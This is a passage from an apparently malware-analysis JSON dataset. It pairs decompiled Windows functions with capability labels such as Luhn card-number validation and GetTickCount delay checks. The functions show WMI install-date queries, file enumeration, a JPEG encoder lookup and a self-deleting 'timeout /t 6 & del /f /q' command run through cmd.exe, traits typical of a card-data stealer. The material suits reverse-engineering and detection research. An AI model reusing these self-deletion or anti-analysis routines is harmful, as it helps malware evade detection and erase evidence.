        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423590(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack132;\n    uint var_70h;\n    uint pvargDest;\n    uint var_60h;\n    int32_t var_54h;\n    int32_t *ppv;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    int32_t *pProxy;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    ushort var_1eh;\n    ushort var_1ch;\n    uint var_1ah;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441350;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack132 = *0x454664 ^ &stack0xfffffffc;\n    puStack20 = &uStack132;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack132;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4444e8, 0, 1, 0x444418, &ppv);\n    arg_8h = 0;\n    pProxy = NULL;\n    iVar1 = (**(*ppv + 0xc))(ppv, L\"ROOT\\\\CIMV2\", 0, 0, 0, 0, 0, 0, &pProxy);\n    if (-1 < iVar1) {\n        (*_sym.imp.ole32.dll_CoSetProxyBlanket)(pProxy, 10, 0, 0, 3, 3, 0, 0);\n        var_4ch = NULL;\n        iVar1 = (**(*pProxy + 0x50))(pProxy, 0x44f9c0, L\"Select * From Win32_OperatingSystem\", 0x20, 0, &var_4ch);\n        if (-1 < iVar1) {\n            var_48h = NULL;\n            var_54h = 0;\n            var_2ch = 0xf;\n            var_30h = 0;\n            var_40h._0_1_ = 0;\n            var_4h._0_1_ = 1;\n            if ((var_4ch != NULL) && ((**(*var_4ch + 0x10))(var_4ch, 0xffffffff, 1, &var_48h, &var_54h),  var_54h != 0))\n            {\n                (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvargDest);\n                var_4h._0_1_ = 2;\n                (**(*var_48h + 0x10))(var_48h, L\"InstallDate\", 0, &pvargDest, 0, 0);\n                fcn.004234f0(var_60h);\n                (**0x4575b4)(&var_70h, &var_24h);\n                uVar2 = (**0x45757c)();\n                uVar2 = (**0x457504)(uVar2, 0, 0x104);\n                (**0x457374)(uVar2, \"%d/%d/%d %d:%d:%d\", var_1eh, var_24h._2_2_, var_24h, var_1ch, var_1ah, \n                             var_1ah._2_2_);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&pvargDest);\n                fcn.00408f80();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 1002
    },
    "00423910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423910(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *in_EAX;\n    ushort *unaff_ESI;\n    \n    *(unaff_ESI + 10) = 7;\n    *(unaff_ESI + 8) = 0;\n    *unaff_ESI = 0;\n    piVar1 = in_EAX + 1;\n    do {\n        iVar2 = *in_EAX;\n        in_EAX = in_EAX + 1;\n    } while (iVar2 != 0);\n    fcn.00423950(in_EAX - piVar1 >> 1);\n    return;\n}\n",
        "token_count": 151
    },
    "00423950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423950(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_10h;\n    int32_t **in_EAX;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (in_EAX != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0x7 < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= in_EAX) {\n            ppiVar2 = in_ECX;\n            if (0x7 < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (in_EAX < ppiVar2 + in_ECX[4] * 2) {\n                if (0x7 < piVar1) {\n                    fcn.004170c0(in_ECX, in_EAX - *in_ECX >> 1);\n                    return;\n                }\n                fcn.004170c0(in_ECX, in_EAX - in_ECX >> 1);\n                return;\n            }\n        }\n    }\n    if (0x7ffffffe < arg_8h) {\n        fcn.0042cb30(\"string too long\");\n    }\n    if (in_ECX[5] < arg_8h) {\n        fcn.00417280();\n        if (arg_8h == NULL) {\n            return;\n        }\n    }\n    else if (arg_8h == NULL) {\n        in_ECX[4] = NULL;\n        if (0x7 < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0x7 < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    arg_10h = arg_8h * 2;\n    fcn.0042f700(ppiVar2, in_EAX, arg_10h);\n    in_ECX[4] = arg_8h;\n    if (in_ECX[5] < 0x8) {\n        *(arg_10h + in_ECX) = 0;\n        return;\n    }\n    *(arg_10h + *in_ECX) = 0;\n    return;\n}\n",
        "token_count": 542
    },
    "00423df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423df0(char *arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    \n    iVar4 = (**0x4573a0)();\n    if (iVar4 == 0) {\n        return in_EAX;\n    }\n    (**0x457498)(0x457830);\n    puVar2 = (iVar4 - in_EAX) + 0x457830;\n    *puVar2 = 0;\n    pcVar1 = arg_8h + 1;\n    do {\n        cVar3 = *arg_8h;\n        arg_8h = arg_8h + 1;\n    } while (cVar3 != '\\0');\n    (**0x457374)(puVar2, 0x44ea24, arg_ch, arg_8h + (iVar4 - pcVar1));\n    return 0x457830;\n}\n",
        "token_count": 227
    },
    "00423e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar * fcn.00423e60(void)\n\n{\n    uchar *puVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t iVar3;\n    \n    puVar1 = fcn.0042d6d0(unaff_EBX);\n    *puVar1 = 0;\n    arg_8h = (**0x45758c)();\n    fcn.0042f3d4(arg_8h);\n    iVar3 = unaff_EBX;\n    if (unaff_EBX < 1) {\n        *puVar1 = 0;\n        return puVar1;\n    }\n    do {\n        iVar2 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar2 % 10);\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar1[unaff_EBX] = 0;\n    return puVar1;\n}\n",
        "token_count": 231
    },
    "00423ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423ec0(uint arg_8h)\n\n{\n    uchar *unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t var_e4h;\n    uint var_d4h;\n    code *var_cch;\n    uint var_90h;\n    uint var_8ch;\n    code *var_84h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_1ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x4424ae;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(unaff_EBX + 0x14) = 0xf;\n    *(unaff_EBX + 0x10) = 0;\n    *unaff_EBX = 0;\n    var_e4h = 0x44fb60;\n    var_d4h = 0x44fb68;\n    var_84h = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    arg_8h_00 = &var_e4h;\n    var_4h = 1;\n    var_34h = 3;\n    fcn.00425a90(arg_8h_00, &var_cch);\n    var_4h = 2;\n    *(&var_e4h + *(var_e4h + 4)) =\n         vtable.std::basic_stringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    fcn.00421710(&var_cch);\n    var_cch = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    var_90h = 0;\n    var_8ch = 0;\n    var_4h = 4;\n    fcn.004249e0(&var_d4h, arg_8h);\n    fcn.004250f0();\n    var_4h = CONCAT31(var_4h._1_3_, 5);\n    fcn.00408ff0();\n    if (0xf < var_1ch) {\n        fcn.0042d62b(var_30h);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.00423ff0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 629
    },
    "00423ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423ff0(int32_t *param_1)\n\n{\n    code **arg_8h;\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4414fb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h = param_1 + 0x18;\n    *(*(*param_1 + 4) + -0x60 + arg_8h) =\n         vtable.std::basic_stringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    var_4h = 0;\n    fcn.00425140(uVar1);\n    var_4h = 0xffffffff;\n    *(*(*param_1 + 4) + -0x60 + arg_8h) = vtable.std::basic_iostream_char__struct_std::char_traits_char__.0;\n    *(*(param_1[4] + 4) + -0x50 + arg_8h) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*param_1 + 4) + -0x60 + arg_8h) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    *arg_8h = vtable.std::ios_base.0;\n    fcn.0042cd59(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 378
    },
    "00424090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424090(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint uVar4;\n    char *arg_8h;\n    char *pcVar5;\n    uchar *unaff_EBX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = in_EAX[4];\n    puVar3 = in_EAX;\n    if (7 < in_EAX[5]) {\n        puVar3 = *in_EAX;\n    }\n    uVar4 = (**0x4574b8)(0, 0, puVar3, iVar2 + 1, 0, 0, 0, 0);\n    arg_8h = fcn.0042cbeb(uVar4);\n    if (7 < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    (**0x4574b8)(0, 0, in_EAX, iVar2 + 1, arg_8h, uVar4, 0, 0);\n    *(unaff_EBX + 0x14) = 0xf;\n    *(unaff_EBX + 0x10) = 0;\n    *unaff_EBX = 0;\n    pcVar5 = arg_8h;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(arg_8h, pcVar5 - (arg_8h + 1));\n    fcn.0042e173(arg_8h);\n    return;\n}\n",
        "token_count": 377
    },
    "00424130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00424130(ushort *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_4h;\n    \n    iVar2 = in_EAX[4];\n    puVar3 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar3 = *in_EAX;\n    }\n    uVar4 = (**0x457394)(0, 0, puVar3, iVar2 + 1, 0, 0);\n    piVar5 = fcn.0042cbeb(-(uVar4 * 2 >> 0x20 != 0) | uVar4 * 2);\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    (**0x457394)(0, 0, in_EAX, iVar2 + 1, piVar5, uVar4);\n    *(arg_8h + 10) = 7;\n    *(arg_8h + 8) = 0;\n    *arg_8h = 0;\n    piVar6 = piVar5;\n    do {\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    fcn.00423950(piVar6 - (piVar5 + 1) >> 1);\n    fcn.0042e173(piVar5);\n    return arg_8h;\n}\n",
        "token_count": 373
    },
    "004241e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004241e0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t var_a8h;\n    uint var_a4h;\n    code *var_58h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x44242f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = &var_a8h;\n    var_4h = 0;\n    var_10h = 0;\n    fcn.00425710(arg_8h_00);\n    var_4h = 1;\n    fcn.00424bd0(&var_a8h, arg_ch, arg_8h_00, uVar1);\n    fcn.004257f0();\n    var_10h = 1;\n    *(&var_a8h + *(var_a8h + 4)) =\n         vtable.std::basic_ostringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    var_4h = 2;\n    fcn.00425140();\n    var_4h = var_4h & 0xffffff00;\n    *(&var_a8h + *(var_a8h + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    var_58h = vtable.std::ios_base.0;\n    fcn.0042cd59(&var_58h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 410
    },
    "004242c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004242c0(int32_t *param_1)\n\n{\n    code **arg_8h;\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4416bb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h = param_1 + 0x14;\n    *(*(*param_1 + 4) + -0x50 + arg_8h) =\n         vtable.std::basic_ostringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    var_4h = 0;\n    fcn.00425140(uVar1);\n    var_4h = 0xffffffff;\n    *(*(*param_1 + 4) + -0x50 + arg_8h) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *arg_8h = vtable.std::ios_base.0;\n    fcn.0042cd59(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 295
    },
    "004243e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004243e0(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint hFindFile;\n    uint lpFindFileData;\n    uint var_270h;\n    uint32_t var_4ch;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x44214a;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar5 = &var_4ch;\n    var_4h = 1;\n    var_14h = uVar2;\n    puVar3 = fcn.00424130(puVar5);\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    arg_8h_00 = &lpFindFileData;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(puVar3, arg_8h_00, puVar5, uVar2);\n    if (7 < var_38h) {\n        fcn.0042d62b(var_4ch);\n    }\n    var_38h = 7;\n    var_3ch = 0;\n    var_4ch = var_4ch & 0xffff0000;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    var_1ch = 7;\n    puVar5 = &var_270h;\n    var_30h = var_30h._2_2_ << 0x10;\n    var_20h = 0;\n    do {\n        iVar1 = *puVar5;\n        puVar5 = puVar5 + 2;\n    } while (iVar1 != 0);\n    fcn.00423950(puVar5 - (&var_270h + 2) >> 1);\n    var_4h._0_1_ = 2;\n    fcn.00425810();\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < var_1ch) {\n        fcn.0042d62b(var_30h);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(uVar4, &lpFindFileData);\n    while (iVar6 != 0) {\n        var_30h = var_30h & 0xffff0000;\n        puVar5 = &var_270h;\n        var_1ch = 7;\n        var_20h = 0;\n        do {\n            iVar1 = *puVar5;\n            puVar5 = puVar5 + 2;\n        } while (iVar1 != 0);\n        fcn.00423950(puVar5 - (&var_270h + 2) >> 1);\n        var_4h._0_1_ = 3;\n        fcn.00425810();\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (7 < var_1ch) {\n            fcn.0042d62b(var_30h);\n        }\n        iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(uVar4, &lpFindFileData);\n    }\n    if (0xf < arg_1ch) {\n        fcn.0042d62b(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 982
    },
    "00424600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00424600(void)\n\n{\n    uint arg_8h;\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h_00;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    char *var_160h;\n    char *var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint32_t var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44167b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00434d30(&var_114h, 0, 0x104, var_10h);\n    fcn.00434d30(&var_16ch, 0, 0x3c);\n    (**0x457520)(&var_114h, 0x44fa7c);\n    (**0x457520)(&var_114h, \"timeout /t 6 & del /f /q \\\"\");\n    arg_8h = (**0x457494)();\n    puVar1 = fcn.00424340(arg_8h);\n    var_4h = 0;\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    (**0x457520)(&var_114h, puVar1);\n    var_4h = 0xffffffff;\n    if (0xf < var_11ch) {\n        fcn.0042d62b(var_130h);\n    }\n    arg_8h_00 = \"\\\" & exit\";\n    var_11ch = 0xf;\n    var_120h = 0;\n    var_130h = var_130h & 0xffffff00;\n    (**0x457520)(&var_114h);\n    var_158h = &var_114h;\n    var_16ch = 0x3c;\n    var_168h = 0;\n    var_164h = 0;\n    var_160h = \"open\";\n    var_15ch = \"C:\\\\Windows\\\\System32\\\\cmd.exe\";\n    var_154h = 0;\n    var_150h = 0;\n    var_14ch = 0;\n    (**0x457584)(&var_16ch);\n    fcn.00434d30(&var_16ch, 0, 0x3c);\n    fcn.00434d30(&var_114h, 0, 0x104);\n    (**0x457484)(0);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 696
    },
    "00424790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00424790(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    (**0x4573e4)(&var_4h, &var_8h);\n    iVar2 = var_8h;\n    if (var_8h == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0042d6d0(var_8h);\n    if (iVar1 != 0) {\n        (**0x457434)(var_4h, iVar2, iVar1);\n        if (var_4h != 0) {\n            puVar4 = iVar1 + 0x30;\n            do {\n                iVar2 = (**0x4574e4)(*puVar4, L\"image/jpeg\");\n                if (iVar2 == 0) {\n                    iVar2 = uVar3 * 0x4c + iVar1;\n                    *arg_8h = *(uVar3 * 0x4c + iVar1);\n                    arg_8h[1] = *(iVar2 + 4);\n                    arg_8h[2] = *(iVar2 + 8);\n                    arg_8h[3] = *(iVar2 + 0xc);\n                    return uVar3;\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 0x13;\n            } while (uVar3 < var_4h);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 394
    },
    "00424dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00424dc0(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar6;\n    int32_t *var_8h;\n    uint var_ch_3;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4420f0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_8h[2] = 0;\n    var_8h[3] = 0;\n    piVar2 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_14h = 0;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 4))();\n    }\n    var_4h = 0;\n    cVar5 = fcn.004211f0();\n    if (cVar5 != '\\0') {\n        var_4h = 2;\n        iVar6 = (**(**(*(*var_8h + 4) + 0x38 + var_8h) + 0x20))(var_ch_3, var_10h_2, var_14h_2);\n        puVar1 = var_8h + 2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + iVar6;\n        var_8h[3] = var_8h[3] + (iVar6 >> 0x20) + CARRY4(uVar3, iVar6);\n        if (iVar6 != CONCAT44(var_14h_2, var_10h_2)) {\n            var_14h = 3;\n        }\n    }\n    var_4h = 1;\n    iVar4 = *(*var_8h + 4);\n    if (var_14h != 0) {\n        var_14h = *(var_8h + iVar4 + 0xc) | var_14h;\n        if (*(var_8h + iVar4 + 0x38) == 0) {\n            var_14h = var_14h | 4;\n        }\n        *(var_8h + iVar4 + 0xc) = var_14h & 0x17;\n        if ((*(var_8h + iVar4 + 0x10) & var_14h & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    var_4h = 0xffffffff;\n    piVar2 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 762
    },
    "004250f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004250f0(void)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    fcn.00425b50(in_EAX + 0x18);\n    return;\n}\n",
        "token_count": 49
    },
    "004257f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004257f0(void)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    fcn.00425b50(in_EAX + 4);\n    return;\n}\n",
        "token_count": 47
    },
    "00425810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425810(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t *unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4420c2;\n    var_ch = *in_FS_OFFSET;\n    uVar4 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = unaff_EBX[1];\n    if ((param_1 < uVar1) && (uVar2 = *unaff_EBX,  uVar2 <= param_1)) {\n        if (uVar1 == unaff_EBX[2]) {\n            fcn.004218f0(uVar4);\n        }\n        puVar3 = unaff_EBX[1];\n        param_1 = *unaff_EBX + ((param_1 - uVar2) / 0x1c) * 0x1c;\n        var_4h = 0;\n        if (puVar3 == NULL) goto code_r0x004258d5;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    else {\n        if (uVar1 == unaff_EBX[2]) {\n            fcn.004218f0(uVar4);\n        }\n        puVar3 = unaff_EBX[1];\n        var_4h = 1;\n        if (puVar3 == NULL) goto code_r0x004258d5;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    fcn.004170c0(param_1, 0);\ncode_r0x004258d5:\n    unaff_EBX[1] = unaff_EBX[1] + 0x1c;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 516
    },
    "00425a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00425a90(int32_t *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x44233b;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h_00 = *(*arg_8h + 4) + arg_8h;\n    fcn.00418610(uVar2);\n    *(arg_8h_00 + 0x38) = arg_ch;\n    *(arg_8h_00 + 0x3c) = 0;\n    uVar1 = fcn.00421840(arg_8h_00, 0x20);\n    *(arg_8h_00 + 0x40) = uVar1;\n    if ((*(arg_8h_00 + 0x38) == 0) &&\n       (uVar2 = *(arg_8h_00 + 0xc) & 0x17 | 4,  *(arg_8h_00 + 0xc) = uVar2,  (*(arg_8h_00 + 0x10) & uVar2) != 0)) {\n        fcn.00418500(0);\n    }\n    *(arg_8h + *(arg_8h[4] + 4) + 0x10) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_iostream_char__struct_std::char_traits_char__.0;\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 516
    },
    "00425b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
